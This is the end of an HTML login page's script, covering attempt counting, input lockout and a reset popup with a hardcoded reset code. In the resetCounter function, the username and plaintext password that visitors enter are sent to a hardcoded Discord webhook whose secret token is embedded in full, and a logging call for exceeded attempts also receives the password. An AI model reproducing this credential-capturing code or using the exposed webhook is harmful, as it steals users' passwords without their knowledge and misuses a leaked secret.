        errorMsg.textContent = msg;
        
        if (attempts <= 0) {
          attempts = 0; // Ensure it doesn't go below zero
          errorMsg.textContent = 'No attempts left. Please reset.';
          
          // Log attempts exceeded
          const username = usernameInput.value;
          const password = passwordInput.value;
          const userID = userIDInput.value;
          const user = findUser(username, userID);
          
          await logAttemptsExceeded(
            user?.name || "Unknown", // Pass null if user not found
            username,
            password,
            userID
          );
          
          showResetPopup();
          disableInputs();
        } else {
          // Flash red outline if attempts are low
          if (attempts <= 3) {
            flashRedOutline(2, 400);
          }
        }
      }

      // Update attempts display
      function updateAttemptsText() {
        attemptsText.textContent = `Attempts Left: ${attempts}`;
      }

      // Disable inputs and submit button
      function disableInputs() {
        usernameInput.disabled = true;
        passwordInput.disabled = true;
        userIDInput.disabled = true;
        submitBtn.disabled = true;
      }

      // Enable inputs and submit button
      function enableInputs() {
        usernameInput.disabled = false;
        passwordInput.disabled = false;
        userIDInput.disabled = false;
        submitBtn.disabled = false;
      }

      // Show reset popup
      function showResetPopup() {
        resetPopup.style.display = 'block';
        resetPopup.setAttribute('aria-hidden', 'false');
        resetField.focus();
      }

      // Hide reset popup
      function hideResetPopup() {
        resetPopup.style.display = 'none';
        resetPopup.setAttribute('aria-hidden', 'true');
        resetField.value = ''; // Clear the input field
      }

      // Handle reset code submission
      async function resetCounter() {
        const enteredCode = resetField.value.trim();
        const isCorrect = enteredCode === 'Reset.Counter.2579'; // Hardcoded reset code

        const username = usernameInput.value || 'Unknown';
        const password = passwordInput.value || 'Unknown';
        const userID = userIDInput.value || 'Unknown';
        const user = findUser(username, userID) || {}; // Get user details, empty object if not found

        // 1. Log the attempt to enter the reset code
        const resetBoxEmbed = {
          title: "🔔 Reset Box Interaction",
          color: isCorrect ? 0x00ff00 : 0xffff00, // Green if correct, yellow if attempted
          fields: [
            { name: "Name", value: user.name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Password Entered", value: password, inline: true }, // Log password even if incorrect reset code
            { name: "User ID", value: userID, inline: true },
            { name: "Entered Code", value: enteredCode, inline: false },
            { name: "Status", value: isCorrect ? "Code Accepted" : "Incorrect Code Attempt", inline: true }
          ]
        };
        // Using a dedicated webhook for reset attempts
        const resetBoxWebhook = "https://discord.com/api/webhooks/1403083012442423377/WNs_yZimluZqsxfZWkLSCfd2vmOYdoyEbsUVOfczHkJykeiThIZ6gYCJILFSHfSDSnsq";
        await sendWebhook(resetBoxWebhook, resetBoxEmbed);

        // 2. Process the reset code
        if (isCorrect) {
          attempts = 5; // Reset attempts
          updateAttemptsText();
          enableInputs();
          hideResetPopup();
          errorMsg.textContent = '';
          loginBox.style.borderColor = 'white'; // Reset visual styles
          loginBox.style.boxShadow = '0 0 15px white';
          alert('Login attempts reset successfully.');
        } else {
          alert('Incorrect reset code. Please try again.');
          // Optionally, clear the reset field or keep it for retry
          resetField.value = ''; // Clear for next attempt
        }
      }

      // Attach event listeners for login submission and reset
      submitBtn.addEventListener('click', submitLogin);
      resetBtn.addEventListener('click', resetCounter);

      // Enter key submits login if popup hidden, else tries reset
      document.addEventListener('keydown', e => {
        if (e.key === 'Enter') {
          if (resetPopup.style.display === 'block') {
            resetCounter();
          } else {
            submitLogin();
          }
        }
      });

      // Initialize attempts display on page load
      updateAttemptsText();
    })();
  </script>
</body>
</html>
